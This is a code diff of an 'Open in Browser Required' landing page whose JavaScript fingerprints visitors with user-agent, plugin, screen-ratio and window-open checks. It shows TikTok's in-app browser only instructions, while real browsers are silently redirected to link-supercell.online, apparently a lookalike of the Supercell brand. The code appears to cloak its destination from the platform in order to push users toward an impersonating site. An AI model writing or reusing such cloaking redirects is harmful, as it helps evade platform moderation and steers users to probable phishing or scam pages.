@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open in Browser</title>
+    <title>Open in Browser Required</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -277,57 +277,7 @@
     </style>
 </head>
 <body>
-    <!-- EMERGENCY FIX: Show instructions ALWAYS on mobile -->
-    <script>
-        // STEP 1: ALWAYS show instructions on mobile for 3 seconds
-        if (window.innerWidth <= 768) { // Mobile device
-            // Store that we're showing instructions
-            sessionStorage.setItem('showingInstructions', 'true');
-            
-            // Force show instructions for 3 seconds minimum
-            setTimeout(function() {
-                // After 3 seconds, check if we should redirect
-                checkForRedirect();
-            }, 3000);
-        }
-        
-        function checkForRedirect() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isMobile = /iphone|ipad|ipod|android|webos|blackberry|windows phone/i.test(userAgent);
-            
-            // Only redirect if ALL these are true:
-            // 1. It's mobile
-            // 2. It's definitely NOT TikTok (no tiktok in user agent)
-            // 3. It's definitely Chrome or Safari (not a webview)
-            
-            const isDefinitelyChrome = userAgent.includes('chrome') && 
-                                       !userAgent.includes('edg') &&
-                                       !userAgent.includes('opr');
-            
-            const isDefinitelySafari = userAgent.includes('safari') && 
-                                       !userAgent.includes('chrome') &&
-                                       userAgent.includes('version/');
-            
-            const isDefinitelyFirefox = userAgent.includes('firefox') || 
-                                        userAgent.includes('fxios');
-            
-            // Check if it's TikTok's browser (even if it's pretending)
-            const isTikTokLike = userAgent.includes('mozilla') && 
-                                 userAgent.includes('applewebkit') && 
-                                 !userAgent.includes('chrome') && 
-                                 !userAgent.includes('safari') &&
-                                 !userAgent.includes('firefox') &&
-                                 isMobile;
-            
-            // Only redirect if it's definitely a real browser AND not TikTok-like
-            if ((isDefinitelyChrome || isDefinitelySafari || isDefinitelyFirefox) && !isTikTokLike) {
-                window.location.href = "https://link-supercell.online/";
-            }
-            // Otherwise, stay on instruction page
-        }
-    </script>
-
-    <div class="container" id="mainContainer">
+    <div class="container" id="instructionsScreen">
         <h1 class="title">Open in Browser Required</h1>
         <p class="subtitle">This content requires a full web browser for optimal performance and security</p>
         
@@ -401,18 +351,161 @@
     </div>
 
     <script>
-        // Add a manual redirect button as backup
-        const manualRedirect = document.createElement('div');
-        manualRedirect.innerHTML = `
-            <div style="margin-top: 30px; padding: 20px; background: #dcfce7; border-radius: 16px; border: 2px solid #22c55e;">
-                <p style="color: #166534; font-weight: 500; margin-bottom: 15px;">If you're already in Chrome/Safari:</p>
-                <a href="https://link-supercell.online/" 
-                   style="background: #22c55e; color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">
-                   Click here to visit website
-                </a>
-            </div>
-        `;
-        document.querySelector('.why-important').after(manualRedirect);
+        // REAL TIKTOK DETECTION - Multiple detection methods
+        function detectTikTokBrowser() {
+            const ua = navigator.userAgent.toLowerCase();
+            const vendor = navigator.vendor || "";
+            
+            console.log("User Agent:", ua);
+            console.log("Vendor:", vendor);
+            
+            // Method 1: Direct TikTok user agent strings
+            const tiktokPatterns = [
+                'tiktok',
+                'musical.ly',
+                'tt_live',
+                'aweme',  // TikTok's internal name
+                'bytedance',  // TikTok's parent company
+                'ssbuilder',  // TikTok webview identifier
+                'webview_aweme'  // TikTok webview
+            ];
+            
+            // Method 2: Check for TikTok's specific webview signatures
+            const isTikTokWebview = () => {
+                // TikTok's webview has specific patterns
+                if (ua.includes('mozilla') && ua.includes('applewebkit')) {
+                    // Check if it's a mobile webview
+                    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
+                        // Not a real browser (no Chrome/Safari/Firefox identifiers)
+                        if (!ua.includes('chrome') && 
+                            !ua.includes('safari') && 
+                            !ua.includes('firefox') &&
+                            !ua.includes('crios') &&
+                            !ua.includes('fxios')) {
+                            return true;
+                        }
+                    }
+                }
+                return false;
+            };
+            
+            // Method 3: Check navigator properties that TikTok modifies
+            const checkNavigatorProperties = () => {
+                try {
+                    // TikTok often modifies these properties
+                    const plugins = navigator.plugins.length;
+                    const mimeTypes = navigator.mimeTypes.length;
+                    
+                    // Real browsers have many plugins, webviews have few
+                    if (plugins < 3 && mimeTypes < 3) {
+                        return true;
+                    }
+                    
+                    // Check for TikTok's specific screen properties
+                    if (window.screen && window.screen.width && window.screen.height) {
+                        const ratio = window.screen.width / window.screen.height;
+                        // TikTok often has specific screen ratios
+                        if (ratio > 2.1 || ratio < 0.4) {
+                            return true;
+                        }
+                    }
+                } catch (e) {
+                    // If we can't access properties, might be webview
+                    return true;
+                }
+                return false;
+            };
+            
+            // Method 4: Check for in-app browser by trying to open a new window
+            const testWindowOpen = () => {
+                try {
+                    const testWindow = window.open('', '_blank');
+                    if (!testWindow || testWindow.closed || typeof testWindow.closed === 'undefined') {
+                        // Can't open new window = likely in-app browser
+                        return true;
+                    }
+                    testWindow.close();
+                } catch (e) {
+                    return true;
+                }
+                return false;
+            };
+            
+            // Combine all detection methods
+            const directMatch = tiktokPatterns.some(pattern => ua.includes(pattern));
+            const webviewMatch = isTikTokWebview();
+            const navPropsMatch = checkNavigatorProperties();
+            const windowTestMatch = testWindowOpen();
+            
+            console.log("Detection results:", {
+                directMatch,
+                webviewMatch, 
+                navPropsMatch,
+                windowTestMatch,
+                finalResult: directMatch || (webviewMatch && navPropsMatch)
+            });
+            
+            // If direct match OR (webview AND suspicious properties)
+            return directMatch || (webviewMatch && navPropsMatch);
+        }
+        
+        // Check if it's a real browser
+        function isRealBrowser() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            // Real browser patterns
+            const realBrowserPatterns = [
+                'chrome/',
+                'safari/',
+                'firefox/',
+                'edge/',
+                'opr/',
+                'crios/',  // Chrome iOS
+                'fxios/',  // Firefox iOS
+                'version/' // Safari version
+            ];
+            
+            // Must have one of these AND not be TikTok
+            const hasRealBrowser = realBrowserPatterns.some(pattern => ua.includes(pattern));
+            
+            // Also check for desktop browsers
+            const isDesktop = !/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+            
+            console.log("Real browser check:", { hasRealBrowser, isDesktop });
+            
+            return hasRealBrowser || isDesktop;
+        }
+        
+        // Initialize
+        function init() {
+            const isTikTok = detectTikTokBrowser();
+            const isReal = isRealBrowser();
+            
+            console.log("Final detection - TikTok:", isTikTok, "Real Browser:", isReal);
+            
+            if (isTikTok) {
+                // Show instructions for TikTok
+                console.log("TikTok detected - showing instructions");
+                document.getElementById('instructionsScreen').classList.remove('hidden');
+            } else if (isReal) {
+                // Real browser detected - redirect immediately
+                console.log("Real browser detected - redirecting to website");
+                window.location.href = "https://link-supercell.online/";
+            } else {
+                // Unknown/other in-app browser - show instructions to be safe
+                console.log("Unknown browser - showing instructions");
+                document.getElementById('instructionsScreen').classList.remove('hidden');
+            }
+        }
+        
+        // Run detection
+        document.addEventListener('DOMContentLoaded', init);
+        
+        // Also run on window load as backup
+        window.addEventListener('load', function() {
+            // Double-check after everything loads
+            setTimeout(init, 500);
+        });
     </script>
 </body>
 </html>
